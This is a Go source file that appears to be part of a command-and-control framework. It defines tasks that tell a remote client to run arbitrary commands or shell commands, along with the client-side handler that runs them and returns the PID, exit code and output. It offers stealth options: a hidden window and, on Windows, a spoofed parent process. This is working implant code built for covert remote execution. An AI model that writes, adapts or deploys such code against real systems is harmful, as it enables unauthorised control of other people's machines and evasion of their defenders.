package task

import (
	"bytes"
	"context"
	"io"
	"strings"
	"time"

	"github.com/iDigitalFlame/xmt/cmd"
	"github.com/iDigitalFlame/xmt/com"
	"github.com/iDigitalFlame/xmt/data"
	"github.com/iDigitalFlame/xmt/device"
)

// Process is a struct that is similar to the 'cmd.Process' struct. This is
// used to Task a Client with running a specified command. These can be
// submitted to the Execute tasklet.
type Process struct {
	Filter *cmd.Filter
	Dir    string

	Env, Args []string
	Stdin     []byte

	Timeout    time.Duration
	Flags      uint32
	Wait, Hide bool
}

// Run will create a Task that will instruct the client to run a command. This
// command will parsed using the 'cmd.Split' function.
//
// This command will run under the current process and will wait until completion.
// Use the 'RunEx' function instead to change this behavior.
//
// The response to this task will return the PID, ExitCode and Stdout/Stderr data.
//
// C2 Details:
//  ID: TvExecute
//
//  Input:
//      - task.Process struct
//        - []string (Args)
//        - string (Dir)
//        - []string (Env)
//        - uint32 (Flags)
//        - int64 (Timeout)
//        - bool (Hide)
//        - bool (Filer != nil)
//        - Filter
//        - []byte (Stdin)
//  Output:
//      - uint32 (pid)
//      - int32 (exit code)
//      - bytes........ (stdout+stderr)
func Run(c string) *com.Packet {
	return RunEx(&Process{Args: cmd.Split(c), Wait: true})
}

// RunEx will create a Task that will instruct the client to run the command and
// options specified in the Process struct.
//
// The response to this task will return the PID, ExitCode and Stdout/Stderr data.
//
// C2 Details:
//  ID: TvExecute
//
//  Input:
//      - task.Process struct
//        - []string (Args)
//        - string (Dir)
//        - []string (Env)
//        - uint32 (Flags)
//        - int64 (Timeout)
//        - bool (Hide)
//        - bool (Filer != nil)
//        - Filter
//        - []byte (Stdin)
//  Output:
//      - uint32 (pid)
//      - int32 (exit code)
//      - bytes........ (stdout+stderr)
func RunEx(p *Process) *com.Packet {
	if p == nil {
		return nil
	}
	n := &com.Packet{ID: TvExecute}
	p.MarshalStream(n)
	return n
}

// RunShell will create a Task that will instruct the client to run a shell
// command. The command will be passed as an argument to the default shell
// found on the device.
//
// This command will run under the current process and will wait until
// completion. Use the 'RunEx' function instead to change this behavior.
//
// The response to this task will return the PID, ExitCode and Stdout/Stderr data.
//
// C2 Details:
//  ID: TvExecute
//
//  Input:
//      - task.Process struct
//        - []string (Args)
//        - string (Dir)
//        - []string (Env)
//        - uint32 (Flags)
//        - int64 (Timeout)
//        - bool (Hide)
//        - bool (Filer != nil)
//        - Filter
//        - []byte (Stdin)
//  Output:
//      - uint32 (pid)
//      - int32 (exit code)
//      - bytes........ (stdout+stderr)
func RunShell(c string) *com.Packet {
	return RunEx(&Process{Args: []string{"@SHELL@", c}, Wait: true})
}

// SetFlags will set the startup Flag values used for Windows programs. This
// function overrites many of the 'Set*' functions.
func (p *Process) SetFlags(f uint32) {
	p.Flags = f
}

// RunArgs will create a Task that will instruct the client to run a command.
// This command and args are the supplied vardict of strings.
//
// This command will run under the current process and will wait until completion.
// Use the 'RunEx' function instead to change this behavior.
//
// The response to this task will return the PID, ExitCode and Stdout/Stderr data.
//
// C2 Details:
//  ID: TvExecute
//
//  Input:
//      - task.Process struct
//        - []string (Args)
//        - string (Dir)
//        - []string (Env)
//        - uint32 (Flags)
//        - int64 (Timeout)
//        - bool (Hide)
//        - bool (Filer != nil)
//        - Filter
//        - []byte (Stdin)
//  Output:
//      - uint32 (pid)
//      - int32 (exit code)
//      - bytes........ (stdout+stderr)
func RunArgs(c ...string) *com.Packet {
	return RunEx(&Process{Args: c, Wait: true})
}

// SetParent will instruct the Process to choose a parent with the supplied
// process Filter. If the Filter is nil this will use the current process (default).
// Setting the Parent process will automatically set 'SetNewConsole' to true
//
// This function has no effect if the device is not running Windows.
func (p *Process) SetParent(f *cmd.Filter) {
	p.Filter = f
}

// SetStdin wil attempt to read all the data from the supplied reader to fill
// the Stdin byte array for this Process struct.
//
// This function will return an error if any errors occurs during reading.
func (p *Process) SetStdin(r io.Reader) error {
	var err error
	p.Stdin, err = io.ReadAll(r)
	return err
}

// MarshalStream writes the data for this Process to the supplied Writer.
func (p *Process) MarshalStream(w data.Writer) error {
	if err := data.WriteStringList(w, p.Args); err != nil {
		return err
	}
	if err := w.WriteString(p.Dir); err != nil {
		return err
	}
	if err := data.WriteStringList(w, p.Env); err != nil {
		return err
	}
	if err := w.WriteBool(p.Wait); err != nil {
		return err
	}
	if err := w.WriteUint32(p.Flags); err != nil {
		return err
	}
	if err := w.WriteInt64(int64(p.Timeout)); err != nil {
		return err
	}
	if err := w.WriteBool(p.Hide); err != nil {
		return err
	}
	if p.Filter != nil {
		if err := w.WriteBool(true); err != nil {
			return err
		}
		if err := p.Filter.MarshalStream(w); err != nil {
			return err
		}
	} else {
		if err := w.WriteBool(false); err != nil {
			return err
		}
	}
	if err := w.WriteBytes(p.Stdin); err != nil {
		return err
	}
	return nil
}

// UnmarshalStream reads the data for this Process from the supplied Reader.
func (p *Process) UnmarshalStream(r data.Reader) error {
	if err := data.ReadStringList(r, &p.Args); err != nil {
		return err
	}
	if err := r.ReadString(&p.Dir); err != nil {
		return err
	}
	if err := data.ReadStringList(r, &p.Env); err != nil {
		return err
	}
	if err := r.ReadBool(&p.Wait); err != nil {
		return err
	}
	if err := r.ReadUint32(&p.Flags); err != nil {
		return err
	}
	if err := r.ReadInt64((*int64)(&p.Timeout)); err != nil {
		return err
	}
	if err := r.ReadBool(&p.Hide); err != nil {
		return err
	}
	if f, err := r.Bool(); err != nil {
		return err
	} else if f {
		p.Filter = new(cmd.Filter)
		if err = p.Filter.UnmarshalStream(r); err != nil {
			return err
		}
	}
	if err := r.ReadBytes(&p.Stdin); err != nil {
		return err
	}
	return nil
}
func execute(x context.Context, r data.Reader, w data.Writer) error {
	var (
		e   Process
		err = e.UnmarshalStream(r)
	)
	if err != nil {
		return err
	}
	if len(e.Args) == 0 {
		return cmd.ErrEmptyCommand
	}
	var (
		p = cmd.NewProcessContext(x, e.Args...)
		o bytes.Buffer
	)
	if e.Args[0] == "@SHELL@" {
		p.Args = []string{device.Shell}
		p.Args = append(p.Args, device.ShellArgs...)
		p.Args = append(p.Args, strings.Join(e.Args[1:], " "))
	}
	if p.SetFlags(e.Flags); e.Hide {
		p.SetWindowDisplay(0)
	}
	if p.SetParent(e.Filter); len(e.Stdin) > 0 {
		p.Stdin = bytes.NewReader(e.Stdin)
	}
	if p.Timeout, p.Dir, p.Env = e.Timeout, e.Dir, e.Env; e.Wait {
		p.Stdout = &o
		p.Stderr = &o
	}
	if err = p.Start(); err != nil {
		p.Stdout, p.Stderr = nil, nil
		return err
	}
	p.Stdin = nil
	if w.WriteUint32(p.Pid()); !e.Wait {
		w.WriteInt32(0)
		return nil
	}
	err = p.Wait()
	if _, ok := err.(*cmd.ExitError); err != nil && !ok {
		return err
	}
	p.Stdout, p.Stderr = nil, nil
	c, _ := p.ExitCode()
	w.WriteInt32(c)
	io.Copy(w, &o)
	o.Reset()
	return nil
}
